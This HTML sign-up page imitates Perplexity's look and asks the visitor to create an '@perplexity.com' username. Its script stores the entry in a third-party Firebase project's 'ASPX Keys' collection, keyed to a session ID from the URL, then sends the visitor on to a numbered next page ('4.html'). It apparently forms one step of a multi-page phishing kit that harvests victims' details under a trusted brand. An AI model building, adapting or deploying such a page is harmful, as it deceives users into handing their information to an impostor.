<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Perplexity - How you’ll sign in</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            height: 100vh;
            margin: 0;
            padding: 40px 20px;
            background-color: #ffffff;
            color: #000;
        }

        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
        }

        h1 {
            font-size: 32px;
            font-weight: 600;
            margin-bottom: 10px;
        }

        .sub-text {
            color: #6e6e73;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 30px;
        }

        .input-group {
            position: relative;
            margin-bottom: 5px;
            text-align: left;
        }

        label {
            position: absolute;
            top: -10px;
            left: 12px;
            background: white;
            padding: 0 4px;
            font-size: 12px;
            color: #6e6e73;
            z-index: 1;
        }

        .input-wrapper {
            display: flex;
            align-items: center;
            border: 1px solid #d1d1d6;
            border-radius: 14px;
            padding: 12px 16px;
            height: 56px;
            box-sizing: border-box;
            background: white;
        }

        .input-wrapper:focus-within {
            border-color: #000;
            border-width: 2px;
        }

        input {
            border: none;
            outline: none;
            font-size: 17px;
            width: 100%;
            background: transparent;
        }

        .domain-suffix {
            color: #8e8e93;
            font-size: 17px;
            margin-left: 4px;
            white-space: nowrap;
        }

        .instruction-text {
            font-size: 13px;
            color: #6e6e73;
            text-align: left;
            margin-top: 8px;
            margin-left: 5px;
        }

        .error-message {
            color: #d93025;
            font-size: 14px;
            margin-top: 8px;
            display: none;
            text-align: left;
            margin-left: 5px;
        }

        .next-btn {
            width: 100%;
            background-color: #000;
            color: #fff;
            border: none;
            border-radius: 30px;
            padding: 16px;
            font-size: 18px;
            font-weight: 500;
            margin-top: 30px;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .next-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>How you’ll sign in</h1>
        <p class="sub-text">Create a email address for signing in to your Perplexity Account</p>

        <div class="input-group">
            <label>Username</label>
            <div class="input-wrapper">
                <input type="text" id="usernameInput" placeholder="Username" autocomplete="off">
                <span class="domain-suffix">@perplexity.com</span>
            </div>
            <div id="instruction" class="instruction-text">You can use letters, numbers & periods</div>
            <div id="errorMsg" class="error-message">That username is taken. Try another.</div>
        </div>

        <button id="nextBtn" class="next-btn">Next</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getFirestore, doc, updateDoc, collection, query, where, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
            authDomain: "question-metabase.firebaseapp.com",
            databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "question-metabase",
            storageBucket: "question-metabase.firebasestorage.app",
            messagingSenderId: "770698198753",
            appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
            measurementId: "G-6ZP1FPMKSJ"
        };

        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        const usernameInput = document.getElementById('usernameInput');
        const nextBtn = document.getElementById('nextBtn');
        const errorMsg = document.getElementById('errorMsg');
        const instructionText = document.getElementById('instruction');

        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session');

        // Logic for handling the "Next" action
        async function handleNext() {
            const username = usernameInput.value.trim();
            if (!username) return;

            const fullEmail = username + "@perplexity.com";
            nextBtn.disabled = true;
            nextBtn.innerText = "Processing...";
            errorMsg.style.display = 'none';
            instructionText.style.display = 'block';

            try {
                // Check if username is taken
                const q = query(collection(db, "ASPX Keys"), where("email", "==", fullEmail));
                const querySnapshot = await getDocs(q);

                if (!querySnapshot.empty) {
                    errorMsg.style.display = 'block';
                    instructionText.style.display = 'none';
                    nextBtn.disabled = false;
                    nextBtn.innerText = "Next";
                } else {
                    // If available, update database and redirect
                    if (sessionId) {
                        const docRef = doc(db, "ASPX Keys", sessionId);
                        await updateDoc(docRef, {
                            email: fullEmail,
                            updatedAt: new Date().toLocaleString('en-US', { timeZone: 'UTC', hour12: true }) + " UTC+5:30"
                        });
                        
                        // Redirect to 4.html with the session ID
                        window.location.href = `4.html?session=${sessionId}`;
                    } else {
                        alert("Error: Session ID missing.");
                        nextBtn.disabled = false;
                        nextBtn.innerText = "Next";
                    }
                }
            } catch (error) {
                console.error("Database Error:", error);
                nextBtn.disabled = false;
                nextBtn.innerText = "Next";
            }
        }

        // restrict input characters
        usernameInput.addEventListener('input', (e) => {
            const val = e.target.value.toLowerCase();
            const cleanVal = val.replace(/[^a-z0-9.]/g, '');
            usernameInput.value = cleanVal;
            errorMsg.style.display = 'none';
            instructionText.style.display = 'block';
        });

        // Click event
        nextBtn.addEventListener('click', handleNext);

        // Enter key event
        usernameInput.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                handleNext();
            }
        });
    </script>
</body>
</html>
